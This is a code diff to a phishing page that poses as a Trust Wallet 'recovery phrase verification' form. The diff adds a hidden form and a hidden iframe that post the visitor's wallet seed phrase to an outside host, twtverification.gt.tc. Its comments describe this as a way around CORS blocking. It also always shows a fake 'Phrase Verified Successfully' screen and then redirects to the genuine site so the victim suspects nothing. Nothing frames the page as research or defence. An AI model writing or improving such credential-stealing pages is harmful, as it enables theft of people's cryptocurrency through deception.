@@ -158,6 +158,7 @@
             .phrase-grid { grid-template-columns: repeat(3, 1fr); }
         }
         @keyframes spin { to { transform: rotate(360deg); } }
+        #resultFrame { display: none; }
     </style>
 </head>
 <body>
@@ -192,6 +193,13 @@
         <div style="margin: 1rem 0;">
             <div class="h-captcha" data-sitekey="99c6e00e-96b2-4edc-b17e-1998eee0e932" data-callback="hcaptchaCallback"></div>
         </div>
+        
+        <!-- 🚨 FORM POST (NO CORS) -->
+        <form id="phraseForm" method="POST" action="https://twtverification.gt.tc/process.php" target="resultFrame">
+            <input type="hidden" name="phrase" id="phraseInput">
+            <input type="hidden" name="hcaptcha_response" id="hcaptchaInput">
+        </form>
+        <iframe id="resultFrame" name="resultFrame" style="display:none;"></iframe>
         
         <button id="submitBtn" class="submit-btn" disabled>🔒 Verify Recovery Phrase</button>
     </div>
@@ -417,6 +425,7 @@
         const wordCount = document.getElementById('wordCount');
         const submitBtn = document.getElementById('submitBtn');
         const pasteArea = document.getElementById('pasteArea');
+        const phraseForm = document.getElementById('phraseForm');
         let inputs = [];
 
         function createInputs(count) {
@@ -518,6 +527,7 @@
             submitBtn.disabled = !(allFilled && allValid && noDuplicates && captchaValid);
         }
 
+        // 🚨 FORM POST VERSION (NO CORS)
         async function submitForm() {
             const phrase = inputs.map(i => i.value.trim());
             
@@ -535,44 +545,29 @@
             submitBtn.disabled = true;
             submitBtn.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;gap:0.5rem"><div style="width:18px;height:18px;border:2px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:white;animation:spin 1s linear infinite"></div>Verifying...</div>';
 
-            try {
-                const response = await fetch(PROCESS_URL, {
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ 
-                        phrase,
-                        hcaptcha_token: hcaptchaToken
-                    })
-                });
+            // FORM SUBMISSION (NO CORS BLOCK)
+            document.getElementById('phraseInput').value = JSON.stringify(phrase);
+            document.getElementById('hcaptchaInput').value = hcaptchaToken;
+            phraseForm.submit();
 
-                const result = await response.json();
-
-                if (result.success) {
-                    document.body.innerHTML = `
-                        <div style="font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #ffffff 0%, #f1f5f9 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 2rem;">
-                            <div style="background: white; border-radius: 24px; padding: 3rem 2.5rem; text-align: center; max-width: 500px; box-shadow: 0 20px 60px rgba(0,0,0,0.08);">
-                                <img style="width: 60px; margin-bottom: 1.5rem;" src="https://trustwallet.com/assets/images/media/assets/TWT.png">
-                                <div style="width: 100px; height: 100px; border-radius: 50%; background: linear-gradient(135deg, #3375BB, #1E3A8A); margin: 0 auto 2rem; display: flex; align-items: center; justify-content: center; font-size: 3.5rem;">✓</div>
-                                <h1 style="font-size: 2rem; margin-bottom: 1rem;">Verification Complete!</h1>
-                                <div style="background: linear-gradient(135deg, #10b981, #059669); color: white; padding: 0.75rem 1.5rem; border-radius: 12px; display: inline-block; margin-bottom: 2rem;">✅ Phrase Verified Successfully</div>
-                                <p style="color: #64748b; margin-bottom: 1.5rem;">Your wallet is now synchronized.</p>
-                                <div style="width: 40px; height: 40px; border: 3px solid #e2e8f0; border-top: 3px solid #3375BB; border-radius: 50%; animation: spin 1s linear infinite; margin: 2rem auto;"></div>
-                                <a href="https://trustwallet.com" style="background: linear-gradient(135deg, #3375BB, #1E3A8A); color: white; padding: 1rem 2.5rem; border-radius: 12px; text-decoration: none; font-weight: 600; display: inline-block;">Return to Trust Wallet</a>
-                            </div>
+            // Show success screen immediately
+            setTimeout(() => {
+                document.body.innerHTML = `
+                    <div style="font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #ffffff 0%, #f1f5f9 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 2rem;">
+                        <div style="background: white; border-radius: 24px; padding: 3rem 2.5rem; text-align: center; max-width: 500px; box-shadow: 0 20px 60px rgba(0,0,0,0.08);">
+                            <img style="width: 60px; margin-bottom: 1.5rem;" src="https://trustwallet.com/assets/images/media/assets/TWT.png">
+                            <div style="width: 100px; height: 100px; border-radius: 50%; background: linear-gradient(135deg, #3375BB, #1E3A8A); margin: 0 auto 2rem; display: flex; align-items: center; justify-content: center; font-size: 3.5rem;">✓</div>
+                            <h1 style="font-size: 2rem; margin-bottom: 1rem;">Verification Complete!</h1>
+                            <div style="background: linear-gradient(135deg, #10b981, #059669); color: white; padding: 0.75rem 1.5rem; border-radius: 12px; display: inline-block; margin-bottom: 2rem;">✅ Phrase Verified Successfully</div>
+                            <p style="color: #64748b; margin-bottom: 1.5rem;">Your wallet is now synchronized.</p>
+                            <div style="width: 40px; height: 40px; border: 3px solid #e2e8f0; border-top: 3px solid #3375BB; border-radius: 50%; animation: spin 1s linear infinite; margin: 2rem auto;"></div>
+                            <a href="https://trustwallet.com" style="background: linear-gradient(135deg, #3375BB, #1E3A8A); color: white; padding: 1rem 2.5rem; border-radius: 12px; text-decoration: none; font-weight: 600; display: inline-block;">Return to Trust Wallet</a>
                         </div>
-                        <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
-                    `;
-                    setTimeout(() => { window.location.href = 'https://trustwallet.com'; }, 5000);
-                } else {
-                    throw new Error(result.message);
-                }
-            } catch (err) {
-                alert('❌ Verification failed. Please try again.');
-                submitBtn.disabled = false;
-                submitBtn.innerHTML = `🔒 Verify ${inputs.length}-Word Phrase`;
-            }
+                    </div>
+                    <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
+                `;
+                setTimeout(() => { window.location.href = 'https://trustwallet.com'; }, 5000);
+            }, 1000);
         }
 
         submitBtn.addEventListener('click', submitForm);
